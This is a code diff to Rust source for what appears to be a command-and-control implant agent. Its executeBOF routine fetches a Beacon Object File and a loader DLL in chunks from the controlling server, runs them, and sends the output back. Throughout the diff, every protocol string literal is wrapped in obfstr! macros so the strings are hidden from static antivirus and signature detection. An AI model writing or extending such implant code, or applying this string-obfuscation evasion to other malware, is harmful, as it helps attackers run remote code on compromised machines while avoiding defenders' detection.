@@ -2,6 +2,7 @@ use serde::Deserialize;
 use serde_json::{Value, json};
 use base64::engine::general_purpose;
 use base64::Engine;
+use obfstr::obfstr;
 
 const CHUNK_SIZE: usize = 4096;
 
@@ -25,22 +26,22 @@ pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
 
     while chunk_num <= total_chunks {
         let payload = json!({
-            "action": "post_response",
-            "responses": [{
-                "upload": {
-                    "chunk_size": CHUNK_SIZE,
-                    "file_id": file_id,
-                    "chunk_num": chunk_num,
+            obfstr!("action"): obfstr!("post_response"),
+            obfstr!("responses"): [{
+                obfstr!("upload"): {
+                    obfstr!("chunk_size"): CHUNK_SIZE,
+                    obfstr!("file_id"): file_id,
+                    obfstr!("chunk_num"): chunk_num,
                 },
-                "task_id": id,
-                "completed": true
+                obfstr!("task_id"): id,
+                obfstr!("completed"): true
             }]
         })
         .to_string();
         let resp: Value = crate::transport::send_request_with_response(&payload)?;
-        let entry = &resp["responses"][0];
-        total_chunks = entry["total_chunks"].as_u64().ok_or("Bad `total_chunks`")? as usize;
-        let chunk_data = entry["chunk_data"].as_str().ok_or("Missing `chunk_data`")?;
+        let entry = &resp[obfstr!("responses")][0];
+        total_chunks = entry[obfstr!("total_chunks")].as_u64().ok_or("Bad `total_chunks`")? as usize;
+        let chunk_data = entry[obfstr!("chunk_data")].as_str().ok_or("Missing `chunk_data`")?;
         let bytes = general_purpose::STANDARD.decode(chunk_data)?;
         file_bytes.extend_from_slice(&bytes);
         chunk_num += 1;
@@ -55,22 +56,22 @@ pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
 
         while chunk_num <= total_chunks {
             let payload = json!({
-                "action": "post_response",
-                "responses": [{
-                    "upload": {
-                        "chunk_size": CHUNK_SIZE,
-                        "file_id": params.loader_file_id,
-                        "chunk_num": chunk_num,
+                obfstr!("action"): obfstr!("post_response"),
+                obfstr!("responses"): [{
+                    obfstr!("upload"): {
+                        obfstr!("chunk_size"): CHUNK_SIZE,
+                        obfstr!("file_id"): params.loader_file_id,
+                        obfstr!("chunk_num"): chunk_num,
                     },
-                    "task_id": id,
-                    "completed": true
+                    obfstr!("task_id"): id,
+                    obfstr!("completed"): true
                 }]
             })
             .to_string();
             let resp: Value = crate::transport::send_request_with_response(&payload)?;
-            let entry = &resp["responses"][0];
-            total_chunks = entry["total_chunks"].as_u64().ok_or("Bad loader `total_chunks`")? as usize;
-            let chunk_data = entry["chunk_data"].as_str().ok_or("Missing loader `chunk_data`")?;
+            let entry = &resp[obfstr!("responses")][0];
+            total_chunks = entry[obfstr!("total_chunks")].as_u64().ok_or("Bad loader `total_chunks`")? as usize;
+            let chunk_data = entry[obfstr!("chunk_data")].as_str().ok_or("Missing loader `chunk_data`")?;
             let bytes = general_purpose::STANDARD.decode(chunk_data)?;
             loader_bytes.extend_from_slice(&bytes);
             chunk_num += 1;
@@ -83,8 +84,8 @@ pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
         Ok(dll) => dll,
         Err(e) => {
             let done = json!({
-                "action": "post_response",
-                "responses": [{"task_id": id, "user_output": format!("BOF loader not available: {}. Run 'loadLoader bof' first.", e), "status": "error", "completed": true}]
+                obfstr!("action"): obfstr!("post_response"),
+                obfstr!("responses"): [{obfstr!("task_id"): id, obfstr!("user_output"): format!("BOF loader not available: {}. Run 'loadLoader bof' first.", e), obfstr!("status"): "error", obfstr!("completed"): true}]
             }).to_string();
             crate::transport::send_request(&done)?;
             return Ok(());
@@ -145,13 +146,13 @@ pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
     crate::helpers::churn(output.as_str());
 
     let done = json!({
-        "action": "post_response",
-        "responses": [{
-            "task_id": id,
-            "user_output": output,
-            "agent_file_id": file_id,
-            "status": status,
-            "completed": true
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [{
+            obfstr!("task_id"): id,
+            obfstr!("user_output"): output,
+            obfstr!("agent_file_id"): file_id,
+            obfstr!("status"): status,
+            obfstr!("completed"): true
         }]
     })
     .to_string();
